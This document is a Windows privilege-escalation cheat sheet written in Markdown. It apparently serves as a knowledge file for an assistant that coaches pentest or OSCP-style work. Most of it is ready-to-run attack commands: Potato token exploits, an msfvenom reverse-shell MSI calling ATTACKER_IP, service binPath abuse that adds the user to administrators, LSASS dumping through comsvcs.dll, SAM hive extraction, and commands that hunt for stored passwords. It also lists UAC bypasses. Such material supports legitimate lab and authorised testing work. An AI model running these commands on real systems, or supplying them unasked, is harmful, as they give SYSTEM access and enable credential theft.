# Moraa — Windows Privilege Escalation

> Owner weak area. Run the checklist top-down. Commands first.
> Start with automated enum, then go straight to the high-yield wins.

---

## 0. Orient (first 60 seconds)

```cmd
whoami /all                         :: SID, groups, PRIVILEGES (read this carefully)
whoami /priv                        :: the privilege list is where the wins are
systeminfo                          :: OS build, hotfixes (for kernel exploit matching)
hostname & ipconfig /all            :: am I domain-joined? second NIC = pivot candidate
net user %username% & net localgroup administrators
```

## 1. Automated enum (run one, read criticals only)

```cmd
.\winPEASany.exe quiet cmd          :: or winpeas.bat ; look for RED/YELLOW
powershell -ep bypass -c ".\PowerUp.ps1; Invoke-AllChecks"
.\Seatbelt.exe -group=all
```

When the user pastes winPEAS output: **highlight only** SeImpersonate, AlwaysInstallElevated,
unquoted service paths, weak service/file/registry ACLs, stored creds, AutoLogon,
scheduled tasks, and unattended files. Ignore the noise.

---

## 2. The high-yield wins (check these in order)

### A. Token privileges → SYSTEM (most common CPTS/OSCP win)

```cmd
whoami /priv
```

| Privilege | Exploit |
|---|---|
| **SeImpersonatePrivilege** | Potato → SYSTEM (service accts, IIS, MSSQL almost always have it) |
| **SeAssignPrimaryToken** | Potato variants |
| SeBackup / SeRestore | Read SAM/SYSTEM hives, or write to protected dirs |
| SeDebug | Dump LSASS, inject into SYSTEM process |
| SeTakeOwnership | Take ownership of a SYSTEM file/registry key |
| SeLoadDriver | Load vulnerable driver → kernel |

```cmd
:: SeImpersonate → SYSTEM. Pick the one that runs on the OS version:
.\PrintSpoofer64.exe -i -c cmd                  :: Win10/2016/2019, needs spooler
.\GodPotato-NET4.exe -cmd "cmd /c whoami"       :: broad coverage, modern default
.\JuicyPotatoNG.exe -t * -p cmd.exe             :: older
.\RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999
```

### B. AlwaysInstallElevated → SYSTEM

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: if BOTH = 0x1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### C. Unquoted service path

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
:: If "C:\Program Files\Some Dir\svc.exe" is unquoted and you can write to an earlier dir:
:: drop C:\Program.exe  or  C:\Program Files\Some.exe  → restart service
sc qc <service>
```

### D. Weak service permissions (reconfigure binPath)

```cmd
:: PowerUp finds these. If you have SERVICE_CHANGE_CONFIG / WRITE_DAC:
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc config <service> binPath= "cmd /c net localgroup administrators %username% /add"
sc stop <service> & sc start <service>
:: or PowerUp:
powershell -c "Invoke-ServiceAbuse -Name '<service>' -UserName 'corp\me'"
```

### E. Writable service binary / DLL hijack

```cmd
:: writable .exe a service runs, or a missing DLL on its search path → replace/plant, restart
.\accesschk.exe -quvw "C:\Path\service.exe"
```

### F. Scheduled tasks running as SYSTEM with writable script/binary

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
:: writable "Task To Run" target + you can wait/trigger → SYSTEM
```

---

## 3. Credential hunting (also feeds lateral movement)

```cmd
:: Stored creds
cmdkey /list
runas /savecred /user:admin cmd                 :: if a cred is saved

:: Files
findstr /si password *.txt *.ini *.config *.xml 2>nul
dir /s /b *unattend* *sysprep* web.config *.kdbx *.ps1 2>nul
type C:\Windows\Panther\Unattend.xml
reg query HKLM /f password /t REG_SZ /s
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s

:: Winlogon autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"

:: WiFi creds
netsh wlan show profile name="SSID" key=clear

:: DPAPI / browser / vault — use a foothold tool
.\SharpDPAPI.exe triage
.\LaZagne.exe all
```

LSASS dump (need SeDebug/admin; parse offline — see `active-directory.md`):

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\out.dmp full
:: then: pypykatz lsa minidump out.dmp
```

SAM/SYSTEM (local hashes):

```cmd
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save
:: impacket-secretsdump -sam sam.save -system system.save LOCAL
```

---

## 4. Other vectors (when the above is dry)

- **UAC bypass** (you're admin but medium-integrity): `fodhelper`, `eventvwr`, or
  `Invoke-WSReset`; check `whoami /groups` for "Medium Mandatory Level".
- **Startup folder / registry Run keys** writable → persistence + escalation if another user logs in.
- **PATH hijack** on a service that calls a binary by name without full path.
- **Kernel exploit** (last resort): match `systeminfo` hotfixes with Watson / wesng:
  `python wes.py systeminfo.txt -i 'Elevation of Privilege'`. Common: PrintNightmare, HEVD labs.
- **Named pipe impersonation**, **Backup Operators** group (read SAM remotely), **Server
  Operators**, **DnsAdmins** (DLL into dns.exe) — group-based paths.

---

## 5. Quick decision tree

```
whoami /priv shows SeImpersonate? ── yes ──► PrintSpoofer / GodPotato ──► SYSTEM
        │ no
AlwaysInstallElevated both 0x1? ── yes ──► msi payload ──► SYSTEM
        │ no
Weak/unquoted/ writable service? ── yes ──► reconfig binPath / plant exe ──► SYSTEM
        │ no
Stored creds / SAM / LSASS readable? ── yes ──► dump → crack/PtH ──► admin or lateral
        │ no
Scheduled task / PATH / startup writable? ── yes ──► plant ──► escalate
        │ no
Match systeminfo to kernel exploit (wesng) ──► last resort
```

Confirm with `whoami` after, then write the win to `findings/` (how you got SYSTEM, evidence).
For domain context, hand off to `active-directory.md` (BloodHound the new identity).
